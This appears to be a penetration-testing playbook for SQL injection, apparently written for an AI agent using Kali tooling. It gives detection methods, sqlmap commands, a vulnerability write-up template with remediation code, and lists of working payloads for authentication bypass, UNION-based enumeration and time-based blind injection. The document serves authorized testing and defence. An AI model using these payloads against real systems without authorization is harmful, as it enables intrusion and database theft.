# SQL Injection Testing Playbook

## Overview
SQL injection (SQLi) is a code injection technique that exploits vulnerabilities in database-driven applications. This playbook provides a structured approach to testing for SQL injection vulnerabilities using **non-destructive, read-only methods**.

## MITRE ATT&CK Mapping
- **Tactic**: Initial Access (TA0001), Privilege Escalation (TA0004)
- **Technique**: Exploit Public-Facing Application (T1190)
- **Sub-Technique**: SQL Injection

## OWASP Reference
- **OWASP Top 10 2021**: A03:2021 – Injection
- **OWASP Testing Guide**: Testing for SQL Injection (WSTG-INPV-05)
- **CWE**: CWE-89 (SQL Injection)

---

## Testing Methodology

### Phase 1: Reconnaissance
Identify potential injection points in the application:
- URL parameters (`?id=1`, `?user=admin`)
- Form inputs (login forms, search boxes, contact forms)
- HTTP headers (User-Agent, Referer, Cookie)
- JSON/XML parameters in API requests
- Hidden form fields

**Tools**: Manual testing, Burp Suite, Browser Developer Tools

---

### Phase 2: Detection

#### 2.1 Error-Based Detection
Inject SQL metacharacters to trigger database errors:

```sql
# Single quote test
'
"
`

# Comment sequences
--
#
/*

# Logical operators
' OR '1'='1
' OR '1'='2
```

**Expected Result**: Database error messages or different application behavior.

**Example**:
```
URL: https://example.com/product.php?id=1'
Error: "You have an error in your SQL syntax near ''1''' at line 1"
```

**Evidence**: Screenshot error message showing SQL syntax error.

---

#### 2.2 Boolean-Based Blind SQLi
Test with true/false conditions:

```sql
# True condition (should return normal response)
' OR '1'='1' --
' OR 1=1 --

# False condition (should return different response)
' OR '1'='2' --
' OR 1=2 --
```

**Expected Result**: Different responses for true vs false conditions.

**Example**:
```
True:  ?id=1' OR '1'='1' --   → Returns product details
False: ?id=1' OR '1'='2' --   → Returns no results or error
```

**Evidence**: Screenshot showing different responses for true/false conditions.

---

#### 2.3 Time-Based Blind SQLi
Inject time delay functions:

```sql
# MySQL
' OR SLEEP(5) --
' AND SLEEP(5) --

# PostgreSQL
' OR pg_sleep(5) --

# Microsoft SQL Server
' OR WAITFOR DELAY '00:00:05' --

# Oracle
' OR dbms_lock.sleep(5) --
```

**Expected Result**: Application delays response by specified seconds.

**Evidence**: Screenshot showing response time (use browser DevTools Network tab).

---

### Phase 3: Exploitation (Non-Destructive Read-Only)

#### 3.1 UNION-Based SQL Injection

**Determine Number of Columns**:
```sql
# Increment until no error
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
...
```

**Extract Database Information (Safe)**:
```sql
# MySQL
' UNION SELECT NULL,@@version,NULL,NULL --
' UNION SELECT NULL,user(),NULL,NULL --
' UNION SELECT NULL,database(),NULL,NULL --

# PostgreSQL
' UNION SELECT NULL,version(),NULL,NULL --

# Microsoft SQL Server
' UNION SELECT NULL,@@version,NULL,NULL --
```

**Example**:
```
URL: https://example.com/product.php?id=1' UNION SELECT NULL,@@version,NULL,NULL --
Result: Displays MySQL version in product description field
```

**Evidence**:
- Screenshot showing database version disclosure
- Screenshot showing current database user
- Screenshot showing database name

---

#### 3.2 Automated Testing with SQLmap (Safe Flags)

**Basic SQLmap Scan (Safe)**:
```bash
sqlmap -u "https://example.com/product.php?id=1" \
  --batch \
  --banner \
  --current-user \
  --current-db \
  --risk=1 \
  --level=1
```

**Safe SQLmap Flags**:
- `--batch` - Non-interactive mode
- `--banner` - Retrieve DBMS banner (version)
- `--current-user` - Retrieve current database user
- `--current-db` - Retrieve current database name
- `--risk=1` - Lowest risk (no destructive queries)
- `--level=1` - Minimal payload testing

**PROHIBITED SQLmap Flags**:
- ❌ `--dump` - Extract table data
- ❌ `--dump-all` - Extract all database data
- ❌ `--passwords` - Dump password hashes
- ❌ `--tables` - List all tables (acceptable only with approval)
- ❌ `--columns` - List table columns (acceptable only with approval)
- ❌ `--sql-shell` - Interactive SQL shell
- ❌ `--os-shell` - Operating system shell

**Execute via Kali MCP**:
```python
mcp__kali_mcp__sqlmap_scan(
  url="https://example.com/product.php?id=1",
  additional_args="--batch --banner --current-user --current-db --risk=1 --level=1"
)
```

**Evidence**:
- Screenshot of SQLmap command execution
- Screenshot of SQLmap results showing injection found
- Screenshot of database version, user, and name
- Save SQLmap log: `03-scanning/web/sqlmap/sqlmap-log.txt`

---

### Phase 4: Impact Assessment

#### 4.1 Proof of Exploitability (Non-Destructive)

**Demonstrate Read Access (Safe)**:
```sql
# Read database metadata only
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata --

# Read table names (metadata only)
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database() --
```

**Stop Here**: Do not extract actual data from tables.

**Evidence**:
- Screenshot showing ability to query `information_schema`
- Document that attacker could read entire database
- **Do not screenshot actual sensitive data**

---

#### 4.2 Assess Authentication Bypass

**Test Authentication Bypass**:
```sql
# Login form SQL injection
Username: admin' OR '1'='1' --
Password: [anything]

# OR
Username: ' OR 1=1 --
Password: ' OR 1=1 --
```

**If Successful**:
- Take screenshot of bypassed authentication
- Screenshot admin panel or authenticated page
- **Log out immediately**
- Document vulnerability

**Evidence**:
- Screenshot of injection payload in login form
- Screenshot of successful authentication bypass
- Screenshot of elevated privileges (if applicable)
- Immediate logout confirmation

---

### Phase 5: Documentation

#### 5.1 Vulnerability Writeup Template

```markdown
# VULN-XXX: SQL Injection in [LOCATION]

## Summary
- **Vulnerability**: SQL Injection
- **Severity**: Critical
- **CVSS Score**: 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Location**: https://example.com/product.php?id=[INJECTION_POINT]
- **Parameter**: id
- **Injection Type**: Union-based / Boolean-based / Time-based
- **DBMS**: MySQL 8.0.25

## Technical Details
The application is vulnerable to SQL injection in the `id` parameter of the product.php endpoint. User-supplied input is directly concatenated into SQL queries without proper sanitization or parameterization.

**Vulnerable Code (estimated)**:
```php
$id = $_GET['id'];
$query = "SELECT * FROM products WHERE id = '$id'";
$result = mysqli_query($conn, $query);
```

## Proof of Concept (Non-Destructive)

### Step 1: Error-Based Detection
1. Navigate to: `https://example.com/product.php?id=1'`
2. Observe SQL syntax error in response
3. Confirms input is processed by SQL engine

### Step 2: Boolean-Based Validation
1. Test true condition: `https://example.com/product.php?id=1' OR '1'='1' --`
2. Test false condition: `https://example.com/product.php?id=1' OR '1'='2' --`
3. Different responses confirm SQL injection

### Step 3: Database Fingerprinting (Read-Only)
1. Inject: `https://example.com/product.php?id=1' UNION SELECT NULL,@@version,NULL,NULL --`
2. Observe database version disclosure: `MySQL 8.0.25`
3. Current user: `webuser@localhost`
4. Current database: `ecommerce_db`

### Step 4: SQLmap Confirmation
```bash
sqlmap -u "https://example.com/product.php?id=1" --batch --banner --current-user --current-db --risk=1 --level=1
```
Result: Injection confirmed, database version retrieved

## Evidence
- **Screenshot 1**: SQL syntax error showing vulnerability
- **Screenshot 2**: Boolean-based true/false response difference
- **Screenshot 3**: Database version disclosure via UNION injection
- **Screenshot 4**: SQLmap output confirming injection
- **Log File**: sqlmap-product-php-log.txt

## Impact Analysis

### Confidentiality: HIGH
- Attacker can read entire database including customer data, credentials, payment information
- Demonstrated read access to `information_schema` (database metadata)

### Integrity: HIGH
- Attacker can modify database records (INSERT, UPDATE, DELETE)
- Authentication bypass possible (demonstrated)

### Availability: HIGH
- Attacker can delete data or drop tables
- Database denial of service possible

### Business Impact
- **Data Breach Risk**: Customer PII, payment data, credentials exposed
- **Compliance Violations**: PCI DSS, GDPR, CCPA
- **Financial Loss**: Fines, legal costs, customer compensation
- **Reputational Damage**: Loss of customer trust

## Attack Chain
1. Identify injection point (product.php?id=)
2. Confirm SQL injection (error-based, boolean-based)
3. Fingerprint database (MySQL 8.0.25)
4. Extract database structure (information_schema)
5. Extract sensitive data (customer table, users table)
6. Lateral movement to other systems using extracted credentials
7. Maintain persistence with backdoor accounts

## MITRE ATT&CK Mapping
- **Tactic**: Initial Access (TA0001)
- **Technique**: Exploit Public-Facing Application (T1190)
- **Tactic**: Credential Access (TA0006)
- **Technique**: Credentials from Database (T1555.003)

## Remediation

### Immediate Actions (Priority 1 - Critical)
1. **Parameterized Queries**: Use prepared statements with bound parameters
   ```php
   $stmt = $conn->prepare("SELECT * FROM products WHERE id = ?");
   $stmt->bind_param("i", $id);
   $stmt->execute();
   ```

2. **Input Validation**: Validate and sanitize all user input
   - Type checking (e.g., integer validation for ID parameters)
   - Whitelist allowed characters
   - Reject SQL metacharacters

3. **Least Privilege**: Database user should have minimal permissions
   - Read-only for web application if possible
   - No DROP, CREATE, or administrative privileges

### Long-Term Solutions (Priority 2 - High)
4. **Web Application Firewall (WAF)**: Deploy ModSecurity or cloud WAF
   - SQL injection signature detection
   - Virtual patching for known vulnerabilities

5. **ORM Framework**: Use Object-Relational Mapping (e.g., Doctrine, Eloquent)
   - Abstracts SQL queries
   - Built-in parameterization

6. **Security Code Review**: Review all database queries in codebase
   - Identify dynamic SQL construction
   - Refactor to use parameterized queries

7. **Automated Security Testing**: Integrate SQLMap or similar into CI/CD pipeline
   - Regression testing for SQL injection

### Validation & Testing
- Re-test with parameterized queries implemented
- Verify input validation blocks malicious input
- Test with SQLmap to confirm remediation
- Code review to ensure consistent implementation

## References
- **CWE**: CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)
- **OWASP**: A03:2021 – Injection
- **CVE**: (None - application-specific vulnerability)
- **CAPEC**: CAPEC-66 (SQL Injection)

## Reproduction Steps for Client
1. Open browser and navigate to: `https://example.com/product.php?id=1`
2. Modify URL to: `https://example.com/product.php?id=1'`
3. Observe SQL error message in response
4. Test boolean injection: `https://example.com/product.php?id=1' OR '1'='1' --`
5. Observe different response confirming SQL injection
6. Run SQLmap for automated confirmation (optional)

**Note**: Client should test in development/staging environment first.
```

---

#### 5.2 Evidence Checklist
- [ ] Screenshot: SQL error message
- [ ] Screenshot: Boolean true/false condition responses
- [ ] Screenshot: Database version disclosure
- [ ] Screenshot: SQLmap confirmation
- [ ] Screenshot: Authentication bypass (if applicable)
- [ ] Log file: SQLmap output saved
- [ ] HTTP requests: Burp Suite captured requests
- [ ] Commands: All commands documented in `commands-used.md`

---

## Common SQL Injection Payloads

### Authentication Bypass
```sql
' OR '1'='1' --
' OR 1=1 --
admin' --
admin' #
' OR 'x'='x
') OR ('1'='1
```

### Union-Based Injection
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Database Enumeration (Safe)
```sql
# MySQL
' UNION SELECT @@version--
' UNION SELECT user()--
' UNION SELECT database()--

# PostgreSQL
' UNION SELECT version()--

# Microsoft SQL Server
' UNION SELECT @@version--
```

### Time-Based Blind
```sql
# MySQL
' AND SLEEP(5)--

# PostgreSQL
' AND pg_sleep(5)--

# MSSQL
' WAITFOR DELAY '00:00:05'--
```

---

## Database-Specific Techniques

### MySQL
```sql
# Version
@@version

# Current user
user()
current_user()

# Current database
database()

# List databases
UNION SELECT schema_name FROM information_schema.schemata

# List tables
UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()
```

### PostgreSQL
```sql
# Version
version()

# Current user
current_user

# Current database
current_database()

# List databases
UNION SELECT datname FROM pg_database

# List tables
UNION SELECT tablename FROM pg_tables WHERE schemaname='public'
```

### Microsoft SQL Server
```sql
# Version
@@version

# Current user
user_name()

# Current database
db_name()

# List databases
UNION SELECT name FROM sys.databases

# List tables
UNION SELECT name FROM sys.tables
```

### Oracle
```sql
# Version
UNION SELECT banner FROM v$version

# Current user
UNION SELECT user FROM dual

# List tables
UNION SELECT table_name FROM all_tables
```

---

## Safety Guidelines

### DO (Safe, Non-Destructive)
- ✅ Test for SQL injection with error-based, boolean-based, time-based methods
- ✅ Retrieve database version, user, and database name
- ✅ Query `information_schema` for metadata (table names, column names)
- ✅ Demonstrate authentication bypass (log out immediately)
- ✅ Use SQLmap with safe flags (`--banner`, `--current-user`, `--current-db`)
- ✅ Screenshot all findings for evidence
- ✅ Document reproduction steps for client

### DO NOT (Destructive, Prohibited)
- ❌ Extract actual sensitive data from tables (use `--dump` or `--dump-all`)
- ❌ Modify database records (INSERT, UPDATE, DELETE)
- ❌ Drop tables or databases (DROP TABLE, DROP DATABASE)
- ❌ Create backdoor accounts or modify user permissions
- ❌ Execute operating system commands (via `xp_cmdshell`, `sys_exec`, etc.)
- ❌ Download database files (backups, data files)
- ❌ Exfiltrate customer data or credentials

---

## Tools & Resources

### Manual Testing
- **Burp Suite** - Intercept and modify HTTP requests
- **Browser DevTools** - Inspect responses and timing
- **Postman** - API endpoint testing

### Automated Testing
- **SQLmap** - Automated SQL injection tool
- **Havij** - GUI-based SQL injection tool (Windows)
- **jSQL Injection** - Cross-platform SQL injection tool

### Kali MCP Command
```python
mcp__kali_mcp__sqlmap_scan(
  url="TARGET_URL",
  data="POST_DATA",  # For POST requests
  additional_args="--batch --banner --current-user --current-db --risk=1 --level=1"
)
```

### Documentation References
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLmap Documentation](https://sqlmap.org/)
- [PortSwigger SQL Injection Guide](https://portswigger.net/web-security/sql-injection)
- [MITRE ATT&CK T1190](https://attack.mitre.org/techniques/T1190/)

---

## Compliance Considerations

### PCI DSS
- Requirement 6.5.1: Injection flaws, particularly SQL injection
- Requirement 11.3: Penetration testing methodology must include injection testing

### OWASP Top 10
- A03:2021 – Injection (includes SQL injection)

### CWE/SANS Top 25
- CWE-89: SQL Injection (Rank #6)

---

## Summary

SQL injection remains one of the most critical web application vulnerabilities. This playbook provides a structured, **non-destructive** approach to testing for SQL injection while maintaining professionalism and ethical boundaries.

**Key Takeaways**:
1. Always test with read-only queries
2. Document every finding with screenshots
3. Use SQLmap with safe flags only
4. Provide clear remediation guidance
5. Enable client to reproduce findings
6. Report critical findings immediately

**Remember**: The goal is to prove the vulnerability exists and assess its impact, not to exploit it for data extraction.
